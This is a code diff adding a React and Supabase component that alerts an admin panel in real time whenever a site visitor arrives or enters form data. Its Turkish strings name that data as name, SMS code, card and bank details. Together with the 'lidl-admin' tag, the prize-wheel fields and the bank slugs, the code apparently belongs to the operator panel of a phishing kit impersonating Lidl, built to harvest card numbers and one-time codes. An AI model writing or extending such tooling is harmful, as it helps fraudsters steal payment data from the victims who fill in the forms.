@@ -1,0 +1,104 @@
+"use client";
+
+import { useEffect, useRef } from "react";
+import { createBrowserSupabaseClient } from "@/lib/supabase/client";
+import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+
+// Tum admin1 sekmelerinde canli kalir: LogsTab kapaliyken (Ayarlar, Kullanicilar,
+// Bankalar, Cark vb.) da sessions degisikliklerini dinler ve bildirim calar.
+// Tarayici sekmesi arka plandaysa ayrica OS duzeyinde Notification gonderir.
+export function AdminNotifier() {
+  const cacheRef = useRef(new Map<string, string>());
+
+  useEffect(() => {
+    const supabase = createBrowserSupabaseClient();
+    if (!supabase) return;
+    let isDisposed = false;
+
+    // OS bildirim izni: kullanici etkilesimi gerekli, ilk click/keydown'da iste
+    const requestPerm = () => {
+      try {
+        if ("Notification" in window && Notification.permission === "default") {
+          void Notification.requestPermission();
+        }
+      } catch {
+        /* ignore */
+      }
+      window.removeEventListener("click", requestPerm);
+      window.removeEventListener("keydown", requestPerm);
+    };
+    window.addEventListener("click", requestPerm);
+    window.addEventListener("keydown", requestPerm);
+
+    const isSoundOn = () => {
+      try {
+        return localStorage.getItem("admin1SoundEnabled") !== "false";
+      } catch {
+        return true;
+      }
+    };
+
+    // LogsTab'daki ile ayni filtre: teknik alanlari bildirime sayma
+    const significant = (data: any) => {
+      if (!data) return {};
+      const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
+      return rest;
+    };
+
+    const notify = (title: string, desc?: string) => {
+      if (!isSoundOn()) return;
+      // LogsTab da aciksa ayni olay icin cift bildirim cikmasin
+      const w = window as any;
+      const now = Date.now();
+      if (w.__adminNotifyAt && now - w.__adminNotifyAt < 800) return;
+      w.__adminNotifyAt = now;
+      try {
+        playBeautifulNotification();
+        showBeautifulToast(title, desc);
+        if (document.hidden && "Notification" in window && Notification.permission === "granted") {
+          new Notification(title, {
+            body: desc || "",
+            icon: "/favicon.ico",
+            tag: `lidl-admin-${now}`,
+          });
+        }
+      } catch {
+        /* ignore */
+      }
+    };
+
+    const channel = supabase
+      .channel("admin1-global-notifier")
+      .on("postgres_changes", { event: "INSERT", schema: "public", table: "sessions" }, (payload) => {
+        if (isDisposed) return;
+        const row = payload.new as any;
+        if (!row?.id || row.is_hidden) return;
+        cacheRef.current.set(
+          row.id,
+          JSON.stringify({ fd: significant(row.form_data), step: row.current_step }),
+        );
+        notify("Yeni Ziyaretçi", "Siteye yeni bir kullanıcı girdi.");
+      })
+      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "sessions" }, (payload) => {
+        if (isDisposed) return;
+        const row = payload.new as any;
+        if (!row?.id || row.is_hidden) return;
+        const cur = JSON.stringify({ fd: significant(row.form_data), step: row.current_step });
+        const prev = cacheRef.current.get(row.id);
+        cacheRef.current.set(row.id, cur);
+        // Ilk gorulen update baseline sayilir; sonrasinda fd/step degismisse bildir
+        if (prev === undefined || prev === cur) return;
+        notify("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+      })
+      .subscribe();
+
+    return () => {
+      isDisposed = true;
+      window.removeEventListener("click", requestPerm);
+      window.removeEventListener("keydown", requestPerm);
+      void supabase.removeChannel(channel);
+    };
+  }, []);
+
+  return null;
+}
